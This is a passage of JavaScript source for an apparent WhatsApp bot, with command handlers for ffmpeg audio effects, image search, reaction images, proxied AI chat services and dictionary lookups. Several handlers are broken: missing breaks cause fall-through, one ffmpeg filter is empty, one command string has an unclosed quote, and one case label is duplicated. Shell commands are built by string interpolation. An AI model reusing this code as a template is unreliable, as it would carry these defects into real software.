  } catch (error) {
    console.error("Error:", error);
    reply("❌ An error occurred while fetching the APK. Please try again.");
  }
 }
 
//====[AUDIO MENU]==========
break
case 'bass': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=54:width_type=o:width=2:g=20 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case "blown": {
  try {
  const quoted = m.quoted ? m. 
  quoted : null;
  const mime = quoted?.
  mimetype || "";
  if (!quoted || !/audio/.test(mime)) {
    return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af atempo=4/4,asetrate=44500*2/3 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case 'earrape': {
try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af volume=12 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case "volaudio": {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to adjust volume.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -filter:a volume= ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
case 'treble': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=10000:width_type=o:width=2:g=15 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case 'fast': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "atempo=1.5" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case 'slow': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath}  -filter:a "atempo=0.8 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
case 'reverse': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter_complex "areverse" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'echo': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "aecho=0.8:0.9:1000:0.3" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'robot': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'deep': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "asetrate=44100*0.7,aresample=44100" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'chipmunk': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "asetrate=44100*1.5,aresample=44100" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'nightcore': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "atempo=1.06,asetrate=44100*1.25" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case 'instrumental': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to extract instrumental.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Using the karaoke filter to remove vocals (center channel removal)
    exec(`ffmpeg -i ${mediaPath} -af "pan=stereo|c0=c0|c1=c1,aresample=async=1:first_pts=0" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'vocalremove': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to remove vocals.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // More advanced vocal removal technique
    exec(`ffmpeg -i ${mediaPath} -af "pan=stereo|c0=c0|c1=-1*c1" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'karaoke': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to create karaoke version.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different approach to vocal removal
    exec(`ffmpeg -i ${mediaPath} -af "stereotools=mode=ms>lr" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

//====end of audio menu =====

//=====[IMAGE MENU]======[
case "wallpaper": {
if (!text) return reply("📌 *Enter a search query.*");

      try {
        const results = await wallpaper(text);
        if (!results.length) return reply("❌ *No wallpapers found.*");

        const randomWallpaper = results[Math.floor(Math.random() * results.length)];
        await conn.sendMessage(
          m.chat,
          {
            caption: `📌 *Title:* ${randomWallpaper.title}\n📁 *Category:* ${randomWallpaper.type}\n🔗 *Source:* ${randomWallpaper.source}\n🖼️ *Media URL:* ${randomWallpaper.image[2] || randomWallpaper.image[1] || randomWallpaper.image[0]}`,
            image: { url: randomWallpaper.image[0] }
          },
          { quoted: m }
        );
      } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while fetching the wallpaper.*");
      }
}
break
case " Wikipedia": {
if (!text) return reply("📌 *Enter a search query.*");

      try {
        const results = await wikimedia(text);
        if (!results.length) return reply("❌ *No Wikimedia results found.*");

        const randomWiki = results[Math.floor(Math.random() * results.length)];
        await conn.sendMessage(
          m.chat,
          {
            caption: `📌 *Title:* ${randomWiki.title}\n🔗 *Source:* ${randomWiki.source}\n🖼️ *Media URL:* ${randomWiki.image}`,
            image: { url: randomWiki.image }
          },
          { quoted: m }
        );
      } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while fetching Wikimedia results.*");
      }
}
break
case "remini": {
const quoted = m.quoted ? m.quoted : null || m.msg ;
      const mime = quoted?.mimetype || "";

      if (!quoted) return reply("📌 *Send or reply to an image.*");
      if (!/image/.test(mime)) return reply(`📌 *Send or reply to an image with caption:* ${prefix + command}`);

      try {
        const media = await m.quoted.download();
        if (!media) return reply("❌ *Failed to download media. Try again.*");

        const enhancedImage = await remini(media, 'enhance');
        await conn.sendMessage(m.chat, { image: enhancedImage, caption: "*Image enhanced successfully*" }, { quoted: m });
      } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while enhancing the image.*");
      }
}
break
case 'kiss':
case 'cium':
case 'beso':
await fetchReactionImage({ conn, m, reply, command: 'kiss' });
break;
case "cry": {
await fetchImageReaction({ conn, m, reply, command: 'cry' });
}
break
case "blush": {
await fetchReactionImage({ conn, m, reply, command: 'blush'});
}
break
case 'dance': {
await fetchReactionImage ({ conn, m, reply, command: 'dance'})
}
break
case "kill": {
await fetchReactionImage ({ conn, m, reply, command: 'kill'})
}
break
case "hug": {
await fetchReactionImage ({ conn, m, reply, command: 'kill'})
}
break
case "kick3": {
await fetchReactionImage ({ conn, m, reply, command: 'kick3'})
}
break
case "slap": {
await fetchReactionImage ({ conn, m, reply, command: 'slap'})
}
break
case "happy": {
await fetchReactionImage ({ conn, m, reply, command: 'happy'})
}
break
case 'bully': {
await fetchReactionImage ({ conn, m, reply, command: 'bully'})
}
break
case "pat":
case "headpat":
case "pet":
await fetchReactionImage({ conn, m, reply, command: 'pat' });
break;
case "poke":
case "pokes":
await fetchReactionImage({ conn, m, reply, command: 'poke' });
break;
case "smile":
case "smiling":
await fetchReactionImage({ conn, m, reply, command: 'smile' });
break;
case "wave":
case "waving":
case "bye":
await fetchReactionImage({ conn, m, reply, command: 'wave' });
break;
case "cuddle":
case "snuggle":
await fetchReactionImage({ conn, m, reply, command: 'cuddle' });
break;
case "highfive":
case "high-five":
case "hi5":
await fetchReactionImage({ conn, m, reply, command: 'highfive' });
break;
case "lick":
await fetchReactionImage({ conn, m, reply, command: 'lick' });
break;
case "bite":
case "biting":
await fetchReactionImage({ conn, m, reply, command: 'bite' });
break;
case "glomp":
case "tacklehug":
await fetchReactionImage({ conn, m, reply, command: 'glomp' });
break;
case "bonk":
case "hit":
await fetchReactionImage({ conn, m, reply, command: 'bonk' });
break;
case "yeet":
case "throw":
await fetchReactionImage({ conn, m, reply, command: 'yeet' });
break;
case "smug":
case "smirking":
await fetchReactionImage({ conn, m, reply, command: 'smug' });
break;
case "nom":
case "eat":
await fetchReactionImage({ conn, m, reply, command: 'nom' });
break;
case "sleepy":
case "sleep":
await fetchReactionImage({ conn, m, reply, command: 'sleepy' });
break;
case "facepalm":
case "palm":
await fetchReactionImage({ conn, m, reply, command: 'facepalm' });
break;
case "wink":
case "winking":
await fetchReactionImage({ conn, m, reply, command: 'wink' });
break;
case "shy":
case "shyness":
await fetchReactionImage({ conn, m, reply, command: 'shy' });
break;
case "stare":
case "staring":
await fetchReactionImage({ conn, m, reply, command: 'stare' });
break;
case "thinking":
case "think":
await fetchReactionImage({ conn, m, reply, command: 'thinking' });
break;
case "shoot":
case "gun":
await fetchReactionImage({ conn, m, reply, command: 'shoot' });
break;
case "run":
case "running":
await fetchReactionImage({ conn, m, reply, command: 'run' });
break;
case "shrug":
case "idk":
await fetchReactionImage({ conn, m, reply, command: 'shrug' });
break;
case "panic":
case "panicking":
await fetchReactionImage({ conn, m, reply, command: 'panic' });
break;
case "tease":
case "teasing":
await fetchReactionImage({ conn, m, reply, command: 'tease' });
break;
case "shiver":
case "cold":
await fetchReactionImage({ conn, m, reply, command: 'shiver' });
break;
case "bored":
case "boring":
await fetchReactionImage({ conn, m, reply, command: 'bored' });
break;
case "scream":
case "yell":
await fetchReactionImage({ conn, m, reply, command: 'scream' });
break;
case "pout":
case "sulking":
await fetchReactionImage({ conn, m, reply, command: 'pout' });
break;
case "handhold":
case "holdinghands":
await fetchReactionImage({ conn, m, reply, command: 'handhold' });
break;
case "spank":
case "spanking":
await fetchReactionImage({ conn, m, reply, command: 'spank' });
break;
case "tickle":
case "tickling":
await fetchReactionImage({ conn, m, reply, command: 'tickle' });
break;
case "cringe":
case "cringing":
await fetchReactionImage({ conn, m, reply, command: 'cringe' });
break;
case "party":
case "partying":
await fetchReactionImage({ conn, m, reply, command: 'party' });
break;
case "celebrate":
case "celebration":
await fetchReactionImage({ conn, m, reply, command: 'celebrate' });
break;

//======[Ai menu]=====[
case "generate": {
if (!text) return reply(global.mess.notext);

    const api3Url = `https://api.gurusensei.workers.dev/dream?prompt=${encodeURIComponent(text)}`;
    try {
      await conn.sendMessage(m.chat, { image: { url: api3Url } }, { quoted: m });
    } catch (error) {
      console.error('Error generating image:', error);
      reply(mess.error);
    }
}
break
case 'copilot':
case 'ask': {
    if (!text) return m.reply('❓ *Please ask me something!*\nExample: .copilot How are you?');
    
    try {
        m.reply('🤔 *Thinking...*');
        
        const response = await fetch(`https://meta-api.zone.id/ai/copilot?message=${encodeURIComponent(text)}&model=default`);
        const data = await response.json();
        
        await m.reply(`🤖 *Copilot AI*\n\n${data.answer || '❌ No response from AI'}`);
    } catch (error) {
        console.error(error);
        await m.reply(mess.error);
    }
    
}
break
case 'gpt':
case 'chatgpt':
case 'ai': {
    if (!text) return m.reply('🤖 *Ask ChatGPT*\nExample: .gpt How are you?');
    
    try {
        m.reply('⚡ *Thinking...*');
        
        const response = await fetch(`https://meta-api.zone.id/ai/chatgptfree?prompt=${encodeURIComponent(text)}&model=chatgpt4`);
        const data = await response.json();
        
        await m.reply(`🤖 *ChatGPT*\n\n${data.answer || '❌ No response'}`);
    } catch (error) {
        console.error(error);
        await m.reply(mess.error);
    }
    
}
break
case 'gpt2':
case 'chatgpt': {
    if (!text) return reply(`Please provide a query/question\n\nExample: ${prefix + command} what is artificial intelligence?`);
    
    try {
        // Send "typing..." indicator
        await conn.sendPresenceUpdate('composing', m.chat);
        
        // Encode the query for the API
        const query = encodeURIComponent(text);
        const apiUrl = `https://api.giftedtech.co.ke/api/ai/ai?apikey=gifted&q=${query}`;
        
        // Fetch response from API
        const { data } = await axios.get(apiUrl);
        
        let response;
        
        if (data && data.result) {
            response = data.result;
        } else if (data && data.message) {
            response = data.message;
        } else {
            response = "❌ Sorry, I couldn't process your request at the moment. Please try again later.";
        }
        
        // Format the response
        const finalResponse = `🤖 *GPT RESPONSE*\n\n${response}\n\n*Powered by Jexploit AI*`;
        
        await reply(finalResponse);
        
    } catch (error) {
        console.error('GPT Command Error:', error);
        reply(mess.error);
    }
}
break
case 'metaai': {
    if (!text) return reply(`❌ *Please provide a question!*\n\n📌 *Example:* ${prefix}gpt Hello, how are you?`);

    try {
        // React while processing
        await conn.sendMessage(m.chat, { react: { text: "💭", key: m.key } });

        // API URL
        const apiUrl = `https://api.nekolabs.web.id/text-generation/ai4chat?text=${encodeURIComponent(text)}`;
        
        // Fetch response from API
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (data.success && data.result) {
            // Format the response nicely
            const replyText = `🤖 *AI Response*\n\n${data.result}\n\n⏱️ *Response Time:* ${data.responseTime || 'N/A'}`;
            
            await conn.sendMessage(
                m.chat,
                { text: replyText },
                { quoted: m }
            );
            
            // Success reaction
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        } else {
            throw new Error('No response from AI');
        }
        
    } catch (error) {
        console.error('GPT command error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(mess.error);
    }
}
break
case 'llama': {
  if (!q) return reply('*Please ask me something*');
  
  try {
    const response = await fetch(`https://api.privatezia.biz.id/api/ai/deepai?query=${encodeURIComponent(q)}`);
    const data = await response.json();
    
    // Based on your example response structure:
    // {
    //   "status": true,
    //   "creator": "@ZiaUlhaq",
    //   "data": "**Introduction to JavaScript**\n\nJavaScript is a high-level..."
    // }
    
    if (data.status) {
      // Check if data.data exists and is not empty
      if (data.data) {
        reply(`🤖 ${data.data}`);
      } else {
        reply('Response received but data field is empty');
      }
    } else {
      reply('API returned false status');
    }
    
  } catch (error) {
    console.error('deepai error:', error);
    reply(mess.error);
  }
  
}
break
case 'bb':
case 'blackbox': {
  if (!q) return reply('*Please ask me something*');
  
  try {
    const response = await fetch(`https://api.privatezia.biz.id/api/ai/blackbox?query=${encodeURIComponent(q)}`);
    const data = await response.json();
    
    // Based on your example response structure:
    // {
    //   "status": true,
    //   "creator": "@ZiaUlhaq",
    //   "data": "**Introduction to JavaScript**\n\nJavaScript is a high-level..."
    // }
    
    if (data.status) {
      // Check if data.data exists and is not empty
      if (data.data) {
        reply(`🤖 ${data.data}`);
      } else {
        reply('Response received but data field is empty');
      }
    } else {
      reply('API returned false status');
    }
    
  } catch (error) {
    console.error('deepai error:', error);
    reply(mess.error);
  }
  
}
break
case 'dalle': {
  if (!q) return reply('*Please ask me something*');
  
  try {
    const response = await fetch(`https://api.privatezia.biz.id/api/ai/luminai?query=${encodeURIComponent(q)}`);
    const data = await response.json();
    
    // Based on your example response structure:
    // {
    //   "status": true,
    //   "creator": "@ZiaUlhaq",
    //   "data": "**Introduction to JavaScript**\n\nJavaScript is a high-level..."
    // }
    
    if (data.status) {
      // Check if data.data exists and is not empty
      if (data.data) {
        reply(`🤖 ${data.data}`);
      } else {
        reply('Response received but data field is empty');
      }
    } else {
      reply('API returned false status');
    }
    
  } catch (error) {
    console.error('dalle error:', error);
    reply(mess.error);
  }
  
}
break
case 'summarize': {
  if (!q) return reply('*Please ask me something*');
  
  try {
    const response = await fetch(`https://api.privatezia.biz.id/api/ai/ai4chat?query=${encodeURIComponent(q)}`);
    const data = await response.json();
    
    // Based on your example response structure:
    // {
    //   "status": true,
    //   "creator": "@ZiaUlhaq",
    //   "data": "**Introduction to JavaScript**\n\nJavaScript is a high-level..."
    // }
    
    if (data.status) {
      // Check if data.data exists and is not empty
      if (data.data) {
        reply(`🤖 ${data.data}`);
      } else {
        reply('Response received but data field is empty');
      }
    } else {
      reply('API returned false status');
    }
    
  } catch (error) {
    console.error('summarize error:', error);
    reply(mess.error);
  }
  
}
break
case 'venice':
case 'vai': {
    await veniceAICommand(conn, m.chat, text, m);
    break;
}

case 'mistral': {
    await mistralAICommand(conn, m.chat, text, m);
    break;
}

case 'perplexity': {
    await perplexityAICommand(conn, m.chat, text, m);
    break;
}

case 'bard': {
    await bardAICommand(conn, m.chat, text, m);
    break;
}

case 'gpt4nano':
case 'gpt41nano': {
    await gpt4NanoAICommand(conn, m.chat, text, m);
    break;
}

case 'kelvinai': {
    await kelvinAICommand(conn, m.chat, text, m);
    break;
}

case 'claude': {
    await claudeAICommand(conn, m.chat, text, m);
    break;
}
case 'math':
case 'simplify': {
    if (!text) return reply(`Please provide a math expression to simplify.\n\nExample:\n${prefix}math 2^8\n${prefix}simplify (5+3)*2`);

    const expression = text.trim();
    
    // Send processing message
    await reply('Simplifying expression... Please wait...');
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
      
        const apiUrl = `https://apiskeith.top/math/simplify?expr=${encodeURIComponent(expression)}`;
        const response = await axios.get(apiUrl, { timeout: 10000 });
        
        // Check response
        if (!response.data?.status) {
            throw new Error('Invalid API response');
        }

        const result = response.data.result;
        
        // Format the response
        const replyMsg = `🧮 *Math Simplification*\n\n` +
                        `📝 *Expression:* ${response.data.expression}\n` +
                        `✅ *Result:* ${result}\n\n` +
                        `> ${global.wm}`;

        await conn.sendMessage(m.chat, { text: replyMsg }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Math API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = '❌ Failed to simplify expression. ';
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else {
            errorMsg += 'Please check your expression and try again.';
        }
        reply(errorMsg);
    }
    break;
}
case 'dictionary':
case 'dict':
case 'define': {
    if (!text) return reply(`*Dictionary*\n\nPlease provide a word to define.\n\nExample:\n${prefix}dictionary cat\n${prefix}define hello\n${prefix}dict computer`);

    const word = text.trim().toLowerCase();
    
    // Send processing message
    await reply(`🔍 Searching definition for: *${word}*...`);
    await conn.sendMessage(m.chat, { react: { text: '📖', key: m.key } });

    try {
        // Call the dictionary API
        const apiUrl = `https://apiskeith.top/education/dictionary?q=${encodeURIComponent(word)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        
        // Check response
        if (!response.data?.status || !response.data?.result) {
            throw new Error('Invalid API response');
        }

        const data = response.data.result;
        
        // Format the dictionary entry
        let definitionText = `📖 *Dictionary: ${data.word}*\n\n`;
        
        // Add phonetics if available
        if (data.phonetics && data.phonetics.length > 0) {
            const pronunciation = data.phonetics.find(p => p.text) || data.phonetics[0];
            if (pronunciation.text) {
                definitionText += `🔊 *Pronunciation:* ${pronunciation.text}\n`;
            }
        }
        
        definitionText += `\n`;
        
        // Add meanings
        if (data.meanings && data.meanings.length > 0) {
            data.meanings.forEach((meaning, index) => {
                definitionText += `*${meaning.partOfSpeech.toUpperCase()}*\n`;
                
                if (meaning.definitions && meaning.definitions.length > 0) {
                    // Show first 3 definitions to avoid long messages
                    meaning.definitions.slice(0, 3).forEach((def, i) => {
                        definitionText += `${i+1}. ${def.definition}\n`;
                        
                        // Add example if available
                        if (def.example) {
                            definitionText += `   _\"${def.example}\"_\n`;
                        }
                    });
                    
                    if (meaning.definitions.length > 3) {
                        definitionText += `   *+${meaning.definitions.length - 3} more definitions*\n`;
                    }
                }
                
                // Add synonyms if available
                if (meaning.synonyms && meaning.synonyms.length > 0) {
                    definitionText += `   *Synonyms:* ${meaning.synonyms.slice(0, 5).join(', ')}`;
                    if (meaning.synonyms.length > 5) {
                        definitionText += ` +${meaning.synonyms.length - 5} more`;
                    }
                    definitionText += `\n`;
                }
                
                definitionText += `\n`;
            });
        }
        
        // Add source
        if (data.sourceUrls && data.sourceUrls.length > 0) {
            definitionText += `📚 *Source:* ${data.sourceUrls[0]}\n`;
        }
        
        // Check if message is too long and truncate if needed
        if (definitionText.length > 4000) {
            definitionText = definitionText.substring(0, 4000) + '\n\n_...definition truncated (too long)_';
        }

        await conn.sendMessage(m.chat, { text: definitionText }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Dictionary API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = `❌ Could not find definition for "*${word}*". `;
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else if (error.response?.status === 404) {
            errorMsg = `❌ No definition found for "*${word}*". Please check the spelling.`;
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case 'poem':
case 'randompoem': {
    // Send processing message
    await reply('Finding a random poem for you... Please wait...');
    await conn.sendMessage(m.chat, { react: { text: '📖', key: m.key } });

    try {
        // the random poem API
        const apiUrl = 'https://apiskeith.top/education/randompoem';
        const response = await axios.get(apiUrl, { timeout: 15000 });
        
        // Check response
        if (!response.data?.status || !response.data?.result) {
            throw new Error('Invalid API response');
        }

        const poem = response.data.result;
        
        // Format the poem beautifully
        let poemText = `📜 *${poem.title}*\n`;
        poemText += `✍️ *by ${poem.author}*\n\n`;
        
        // Add the poem lines
        if (poem.lines && poem.lines.length > 0) {
            poemText += poem.lines.join('\n');
        } else if (poem.fullText) {
            poemText += poem.fullText;
        }
        
        // Add line count at the bottom
        if (poem.lineCount) {
            poemText += `\n\n_━━━━━━━━━━━━━━_\n📊 *${poem.lineCount} lines*`;
        }

        await conn.sendMessage(m.chat, { text: poemText }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Random Poem API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = '❌ Failed to fetch a random poem. ';
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case 'fruit':
case 'fruitinfo': {
